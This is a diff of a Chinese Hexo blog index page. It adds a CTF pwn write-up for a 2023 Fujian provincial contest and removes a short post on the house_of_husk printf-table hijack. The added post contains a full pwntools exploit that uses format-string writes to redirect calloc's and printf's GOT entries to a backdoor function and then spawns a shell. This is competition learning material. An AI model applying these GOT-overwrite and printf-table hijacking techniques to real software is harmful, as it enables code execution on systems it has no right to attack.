@@ -159,6 +159,96 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/19/2023%E7%A6%8F%E5%BB%BA%E7%9C%81%E8%B5%9Bpwn-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="hkbin">
+      <meta itemprop="description" content="hkbin hkbin hkbin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hkbin的小博客~">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/19/2023%E7%A6%8F%E5%BB%BA%E7%9C%81%E8%B5%9Bpwn-wp/" class="post-title-link" itemprop="url">2023福建省赛pwn wp</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-10-19 22:35:05 / 修改时间：22:40:15" itemprop="dateCreated datePublished" datetime="2023-10-19T22:35:05+08:00">2023-10-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>378</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>漏洞点很多：</p>
+<p>格式化字符串漏洞</p>
+<p>后门</p>
+<p>泄露libc函数等</p>
+<p>不过值得一提的是 栈溢出是假的(那个函数返回地址由堆的一个东西管理</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>设定了函数call前RSP为0结尾，直接挟持got表改写后门函数会出现不对其错误</p>
+<p>所以我们可以挟持两个函数，分两个函数来打，可以优秀地控制栈帧</p>
+<p>这里挟持了一个冷门函数calloc的got表为backdoor的地址</p>
+<p>再挟持printf为call calloc的地址即可</p>
+<p>栈上的格式化字符串的打法比较简单，这里就不多说了</p>
+<p>用好fmtstr_payload可以事半功倍</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> gift</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;&quot;</span></span><br><span class="line">remote_port = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(libc_name)</span></span><br><span class="line"></span><br><span class="line">mode = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mode:</span><br><span class="line">    p = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bpp</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\x1B[36m&#123;&#125;\x1B[0m&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    leak_dat = ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]</span><br><span class="line">    <span class="keyword">return</span> u64(leak_dat.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;choose:&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Repeater</span>(<span class="params">payload</span>):</span><br><span class="line">    sla(prefix, <span class="built_in">str</span>(<span class="number">4294967293</span>))</span><br><span class="line">    sa(<span class="string">&quot;You find a Repeater!&quot;</span>, payload + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chance</span>(<span class="params">payload</span>):</span><br><span class="line">    sla(prefix, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>():</span><br><span class="line">    sla(prefix, <span class="built_in">str</span>(<span class="number">10086</span>))</span><br><span class="line">    ru(<span class="string">&quot;Everyone is tired and reduces the workload!&quot;</span>)</span><br><span class="line"></span><br><span class="line">gift()</span><br><span class="line">rl()</span><br><span class="line">puts_got = <span class="built_in">int</span>(rl().decode()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log(<span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">ret_addr = <span class="number">0x401522</span></span><br><span class="line">backdoor = <span class="number">0x401514</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">pad = fmtstr_payload(offset, &#123;elf.got[<span class="string">&#x27;calloc&#x27;</span>]: backdoor&#125;)</span><br><span class="line"></span><br><span class="line">Repeater(pad)</span><br><span class="line"></span><br><span class="line">pad = fmtstr_payload(offset, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]: <span class="number">0x40153D</span>&#125;)</span><br><span class="line"></span><br><span class="line">bpp()</span><br><span class="line">Repeater(pad)</span><br><span class="line"><span class="comment"># bpp()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rl()</span></span><br><span class="line"><span class="comment"># raw = rl()</span></span><br><span class="line"><span class="comment"># log(raw)</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/17/2023-%E9%A6%99%E5%B1%B1%E6%9D%AFpwn-wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -207,7 +297,7 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>4 分钟</span>
+              <span>18 分钟</span>
             </span>
 
         </div>
@@ -307,7 +397,7 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>4 分钟</span>
+              <span>15 分钟</span>
             </span>
 
         </div>
@@ -477,7 +567,7 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>1 分钟</span>
+              <span>2 分钟</span>
             </span>
 
         </div>
@@ -577,7 +667,7 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>2 分钟</span>
+              <span>8 分钟</span>
             </span>
 
         </div>
@@ -674,7 +764,7 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>4 分钟</span>
+              <span>15 分钟</span>
             </span>
 
         </div>
@@ -819,7 +909,7 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>4 分钟</span>
+              <span>16 分钟</span>
             </span>
 
         </div>
@@ -1182,7 +1272,7 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>2 分钟</span>
+              <span>7 分钟</span>
             </span>
 
         </div>
@@ -1420,7 +1510,7 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>1 分钟</span>
+              <span>2 分钟</span>
             </span>
 
         </div>
@@ -1457,123 +1547,6 @@
 <p>因为是相对位移，<strong>所以不需要leak出堆地址。</strong></p>
 <h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>比如当前top_chunk_addr &#x3D; 0x501000</p>
 <p>malloc(-0x1000)即可将top_chunk_addr推至0x500000附近</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/26/house-of-husk/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.png">
-      <meta itemprop="name" content="hkbin">
-      <meta itemprop="description" content="hkbin hkbin hkbin">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hkbin的小博客~">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/09/26/house-of-husk/" class="post-title-link" itemprop="url">house_of_husk</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-09-26 23:50:24" itemprop="dateCreated datePublished" datetime="2023-09-26T23:50:24+08:00">2023-09-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-09-27 11:02:26" itemprop="dateModified" datetime="2023-09-27T11:02:26+08:00">2023-09-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>273</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>house_of_husk是针对带格式化字符输出printf函数的一种攻击</p>
-<p>可以实现控制rip</p>
-<p>适用版本2.23-至今</p>
-<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p><strong>printf会输出前检查是否有自定义格式化字符</strong></p>
-<p>方法是通过两个表：</p>
-<ul>
-<li>__printf_function_table</li>
-<li>__printf_arginfo_table</li>
-</ul>
-<ol>
-<li>先将__printf_function_table的值置为非空</li>
-</ol>
-<p><img src="/./images/house_of_husk%205b722a531dbd41f9afdaaeb0d5208a54/Untitled.png" alt="Untitled"></p>
-<ol>
-<li>然后将__printf_arginfo_table挟持到我们可控的地址</li>
-</ol>
-<p><img src="/./images/house_of_husk%205b722a531dbd41f9afdaaeb0d5208a54/Untitled%201.png" alt="Untitled"></p>
-<p><del>往可控的地方写值，这个有讲究(</del></p>
-<p>最终会调用到__printf_arginfo_table[index]</p>
-<p>这个index和格式化字符的有关：</p>
-<p>比如%d → ord(’d’) → 100</p>
-<p>%s → ord(’s’) → 115</p>
-<p>所以挟持__printf_arginfo_table的时候，比如格式化字符是%d</p>
-<p>那我们就弄成&#x3D;</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__printf_arginfo_table = control_addr - ord(<span class="string">&#x27;d&#x27;</span>)*<span class="number">8</span></span><br></pre></td></tr></table></figure>
-
-<p>然后往control_addr里面写入RIP即可</p>
-<p><img src="/./images/house_of_husk%205b722a531dbd41f9afdaaeb0d5208a54/Untitled%202.png" alt="Untitled"></p>
-<p>其控制流为：</p>
-<p>printf→vfprintf→printf_positional→__parse_one_specmb→RIP</p>
-<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>printf会检查是否有自定义格式化字符(检查的就是__printf_function_table是否为空，如果不为空，则代表有自定义格式化字符，然后就会放弃默认输出方式，而去找__printf_arginfo_table里面的调用函数</p>
-<p>将此两表挟持，即可成功控制RIP</p>
 
       
     </div>
@@ -1660,7 +1633,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1718,13 +1691,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">27k</span>
+    <span title="站点总字数">28k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">25 分钟</span>
+    <span title="站点阅读时长">1:40</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
